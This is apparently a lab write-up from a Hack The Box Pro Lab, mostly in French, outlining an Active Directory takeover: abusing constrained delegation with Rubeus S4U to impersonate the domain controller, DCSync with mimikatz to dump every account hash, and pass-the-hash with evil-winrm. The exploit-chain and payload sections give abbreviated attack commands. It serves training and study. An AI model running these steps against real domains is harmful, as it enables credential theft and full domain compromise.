---
doc_kind: writeup
title: "Zephyr - Painters.htb - Constrained delegation -> S4U -> DCSync -> Domain Admin"
category: web
slug: painters-htb-constrained-delegation-dcsync
created: 2026-10-29
status: solved
tags:
  - constrained-delegation
  - s4u2proxy
  - dcsync
  - domain-admin
  - rubeus
source: "HTB Pro Lab Zephyr"
target: "AD painters.htb, compte avec delegation contrainte vers le DC"
---
# Zephyr - Painters.htb - Constrained delegation -> S4U -> DCSync -> Domain Admin

## Challenge Summary

- Source: HTB Pro Lab Zephyr
- Target: AD painters.htb, compte avec delegation contrainte vers le DC
- Goal: Un compte compromis a une delegation contrainte vers le DC. Rubeus asktgt+s4u impersonne le compte machine DC pour CIFS/HOST/LDAP, permettant un DCSync complet du domaine.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. Activer RDP via registre+firewall sur la machine cible.
2. RDP comme le compte compromis.
3. Rubeus.exe asktgt puis s4u /impersonateuser:DC$ /altservice:CIFS,HOST,LDAP /ptt.
4. mimikatz lsadump::dcsync /user:<domain>\krbtgt /all /csv -> hashes de tous les comptes.
5. evil-winrm avec le hash Administrator sur le DC.

## Key Evidence

- Rubeus s4u2proxy success; klist montrant les tickets DC$; mimikatz DCSync dump complet.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
Rubeus.exe asktgt/s4u, mimikatz lsadump::dcsync, evil-winrm -H (pass-the-hash).
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout (lecture visuelle verifiee).

## Reusable Lessons

- Constrained delegation + S4U2self/S4U2proxy abuse est une technique cle AD, reutilisable des qu'un compte a une delegation contrainte vers un service sensible.

## Pattern Candidates

- Voir pattern associe de meme slug.
